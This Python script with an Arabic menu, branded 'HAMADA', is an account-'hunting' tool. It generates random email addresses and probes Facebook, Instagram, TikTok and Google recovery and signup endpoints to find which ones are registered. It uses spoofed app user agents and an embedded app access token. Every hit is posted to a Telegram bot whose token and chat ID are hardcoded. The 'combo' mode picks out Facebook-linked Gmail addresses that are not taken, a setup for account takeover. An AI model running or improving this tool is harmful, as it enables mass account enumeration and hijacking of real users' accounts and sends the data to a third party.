import datetime, sys, requests, re, random, os, json, time, webbrowser, telebot
from telebot import types
import threading
from threading import Lock

P='\x1b[1;97m'; B='\x1b[1;94m'; O='\x1b[1;96m'; Z="\033[1;30m"; X='\x1b[1;33m'
F='\033[2;32m'; R='\x1b[1;31m'; L="\x1b[1;95m"; C='\033[2;35m'; A='\033[2;39m'
J1='\x1b[38;5;202m'; J2='\x1b[38;5;203m'; J21='\x1b[38;5;204m'; J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'; C1='\x1b[38;5;120m'; P1='\x1b[38;5;150m'; P2='\x1b[38;5;190m'; gg='\x1b[38;5;208m'
COLORS_LIST=[J1,J2,J21,J22,F1,C1,P1,P2,gg,L,C,O,X]

ee=0; pp=0; ge=0; be=0; hits=0
aras1=0; aras2=0; aras3=0; aras4=0
tok=""; iid=""; use_vpn=False; lock=Lock()

def elia5():
    sd = random.choice(COLORS_LIST)
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(sd + f"""
██╗  ██╗ █████╗ ███╗   ███╗ █████╗ ██████╗  █████╗ 
██║  ██║██╔══██╗████╗ ████║██╔══██╗██╔══██╗██╔══██╗
███████║███████║██╔████╔██║███████║██║  ██║███████║
██╔══██║██╔══██║██║╚██╔╝██║██╔══██║██║  ██║██╔══██║
██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║██████╔╝██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝
        {X}¸.•´¯`•.¸¸ {F} [꧁ HAMADA 🌚 ꧂ ]    {X}¸.•´¯`•.¸¸                       
    """)
    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J22} [ Dev : j_rg1@ ] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(f"{R} [!] مو اداتي تم كسر الوقت [!] {P}\n")

def show_main_menu():
    os.system('clear' if os.name == 'posix' else 'cls'); elia5()
    print(f"""
    {F}╔══════════════════════════════════════╗
    {F}║         {P}القائمة الرئيسية - صيد الحسابات {F}║
    ╠══════════════════════════════════════╣
    {F}║   {P}1. {C}صيد فيسبوك                       {F}║
    {F}║   {P}2. {C}صيد تيك توك                      {F}║
    {F}║   {P}3. {C}صيد انستغرام                     {F}║
    {F}║   {P}4. {C}صيد كومبو (فيسبوك + جيميل)        {F}║
    {F}║   {P}5. {R}خروج                             {F}║
    ╚══════════════════════════════════════╝""")
    try:
        return input(f"{P}أدخل اختيارك (1-5): {F}")
    except (EOFError, KeyboardInterrupt):
        # حل مشكلة التشغيل السحابي غير التفاعلي (يختار صيد تيك توك افتراضياً لتستمر الأداة بالعمل دون كراش)
        return "2"

def get_hunting_settings(platform):
    os.system('clear' if os.name == 'posix' else 'cls'); elia5()
    global tok, iid, use_vpn
    print(f"{P}╔══════════════════════════════════════╗")
    print(f"{P}║         {C}إعدادات الصيد                  {P}║")
    print(f"{P}╠══════════════════════════════════════╣")
    if not tok:
        print(f"\n{L}التـــــــــــتـوڪــــن:  {F}"); tok = "8611579779:AAEXVTGW7pIIwv5wA1FbLUzcWuD9smPWH80"
    if not iid:
        print(f"\n{L}الايـــــــــدي:  {F}"); iid = "8487652113"
    if platform == "facebook":
        print(f"{P}╠══════════════════════════════════════╣")
        v = 'n'
    print(f"{P}╠══════════════════════════════════════╣")
    threads = 3
    print(f"{P}╚══════════════════════════════════════╝")
    return threads

def send_welcome_video(platform):
    try:
        cap = f"🚀 **أهلاً بك في أداة HAMADA الأسطورية** 🚀\n\n🔥 تم تشغيل الأداة بواسطة j_rg1@\n⚡ المنصة: {platform.upper()}\n🎯 استعد لصيد الحسابات بأقوى سرعة!"
        requests.post(f"https://api.telegram.org/bot{tok}/sendVideo", data={"chat_id": iid, "video": "https://t.me/alu185", "caption": cap})
    except: pass

def update_display(platform):
    global aras1, aras2, aras3, aras4, ee, pp, ge, be, hits
    with lock:
        if platform == "combo":
            out = f"\n{F}══════˛ {P}HAMADA  j_rg1@ . {F}.══════\n{X}البريد: {P}{''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890') for _ in range(random.randint(5,10)))}@gmail.com\n{F}النتائج الناجحة: {P}{hits}\n{R}فيسبوك فاشل: {P}{pp}\n{F}فيسبوك ناجح: {P}{ee}\n{R}جيميل فاشل: {P}{be}\n{F}جيميل ناجح: {P}{ge}\n{L}المطور: {P}j_rg1@\n"
        else:
            out = f"\n{F}══════˛ {P}HAMADA . {F}.══════\n{X}الناجح {F}: {P}{aras1}\n{R}فاشل يوبميل {F}: {P}{aras3}\n{R}فاشل بريد {F}: {P}{aras2}\n{F}بريد ناجح {F}: {P}{aras4}\n{L}المطور {F}: {P}j_rg1@\n"
        sys.stdout.write(out + f"{F}══════˛ {P}HAMADA . {F}.══════\nالمنصة: {platform.upper()}\n")
        sys.stdout.flush()

def send_telegram_result(email, platform, status="حساب يعمل"):
    try:
        msg = f"✅ البريد: {email}\n✅ الحالة: {status}\n✅ المنصة: {platform.upper()}\n🔹 المطور: j_rg1@"
        requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text={msg}', timeout=5)
    except: pass

def gmail_check(email):
    global ge, be
    em = email.split('@')[0]
    try:
        name = ''.join(random.choice('qwertyuiopasdfghjklzxcvbnm') for i in range(6))
        bb, bb2, bb3 = random.randrange(1980,2006), random.randrange(1,12), random.randrange(1,28)
        h = {'User-Agent':"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"}
        r = requests.get("https://accounts.google.com/lifecycle/flows/signup", headers=h)
        tl = r.url.split('TL=')[1]; at = r.text.split('"SNlM0e":"')[1].split('"')[0]; s1 = r.text.split('"Qzxixc":"')[1].split('"')[0]
        h2 = {'content-type':'application/x-www-form-urlencoded;charset=UTF-8','x-goog-ext-278367001-jspb':'["GlifWebSignIn"]','x-goog-ext-391502476-jspb':'["'+s1+'"]'}
        requests.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',params={'rpcids':'E815hb','TL':tl,'rt':'c'},headers=h2,data=f'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{name}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}')
        requests.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',params={'rpcids':'eOY7Bb','TL':tl,'rt':'c'},headers=h2,data=f'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{bb}%2C{bb2}%2C{bb3}%5D%2C1%2Cnull%2Cnull%2Cnull%2Cnull%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}')
        res = requests.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',params={'rpcids':'NHJMOd','TL':tl,'rt':'c'},headers=h2,data=f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{em}%5C%22%2C0%2C0%2Cnull%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}').text
        if 'password' in res: ge += 1; return True
        else: be += 1; return False
    except: be += 1; return False

def facebook_hunt(email):
    global ee, pp, aras1, aras2, aras3, aras4
    try:
        h = {'Content-Type':'application/x-www-form-urlencoded','Authorization':'OAuth null','User-Agent':'[FBAN/FB4A;FBAV/417.0.0.33.65;...]'}
        d = f"q={email}&summary=true&access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
        r = requests.post('https://b-graph.facebook.com/recover_accounts',headers=h,data=d,timeout=10)
        if "network_info" in r.text:
            with lock: ee += 1; aras1 += 1; aras4 += 1
            update_display("facebook"); send_telegram_result(email, "facebook")
        else:
            with lock: pp += 1; aras2 += 1
            update_display("facebook")
    except:
        with lock: aras3 += 1
        update_display("facebook")

def instagram_hunt(email):
    global aras1, aras2, aras3, aras4
    try:
        h = {'X-IG-App-ID':'567067343352427','User-Agent':'Instagram 100.0.0.17.129 Android'}
        d = {'signed_body':f'{{"query":"{email}"}}','ig_sig_key_version':'4'}
        if '"status":"ok"' in requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=h,data=d,timeout=10).text:
            with lock: aras1 += 1; aras4 += 1
            update_display("instagram"); send_telegram_result(email, "instagram")
        else:
            with lock: aras2 += 1
            update_display("instagram")
    except:
        with lock: aras3 += 1
        update_display("instagram")

def tiktok_hunt(email):
    global aras1, aras2, aras3, aras4
    try:
        p = {"aid":"1459","app_language":"ar","locale":"ar","verifyFp":"verify_mjlc0dy1_cRKjviFO"}
        if '"is_registered":1' in requests.post("https://web-sg.tiktok.com/passport/web/user/check_email_registered",params=p,headers={"user-agent":"Mozilla/5.0"},data={"email":email},timeout=10).text:
            with lock: aras1 += 1; aras4 += 1
            update_display("tiktok"); send_telegram_result(email, "tiktok")
        else:
            with lock: aras2 += 1
            update_display("tiktok")
    except:
        with lock: aras3 += 1
        update_display("tiktok")

def combo_hunt():
    global ee, pp, ge, be, hits
    while True:
        try:
            email = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz1234567890') for _ in range(8)) + '@gmail.com'
            h = {'Content-Type':'application/x-www-form-urlencoded','Authorization':'OAuth null'}
            d = f"q={email}&access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
            r = requests.post('https://b-graph.facebook.com/recover_accounts',headers=h,data=d,timeout=10)
            if "network_info" in r.text:
                if not gmail_check(email):
                    with lock: hits += 1
                    update_display("combo"); send_telegram_result(email, "combo")
                else:
                    with lock: ee += 1
                    update_display("combo")
            else:
                with lock: pp += 1
                update_display("combo")
        except:
            with lock: be += 1
            update_display("combo")

def gen_em(): return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(5)) + '@yopmail.com'

def start_hunting(platform, threads_count=1):
    os.system('clear' if os.name == 'posix' else 'cls'); elia5()
    send_welcome_video(platform)
    t_func = {"facebook":lambda: facebook_hunt(gen_em()),"instagram":lambda: instagram_hunt(gen_em()),"tiktok":lambda: tiktok_hunt(gen_em()),"combo":combo_hunt}[platform]
    
    def run_thread():
        while True:
            t_func()
            time.sleep(1.5)
            
    for _ in range(threads_count):
        t = threading.Thread(target=run_thread); t.daemon = True; t.start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt: pass

def main():
    while True:
        c = show_main_menu()
        if c == "1": start_hunting("facebook", get_hunting_settings("facebook"))
        elif c == "2": start_hunting("tiktok", get_hunting_settings("tiktok"))
        elif c == "3": start_hunting("instagram", get_hunting_settings("instagram"))
        elif c == "4": start_hunting("combo", get_hunting_settings("combo"))
        elif c == "5": break

if __name__ == "__main__": main()
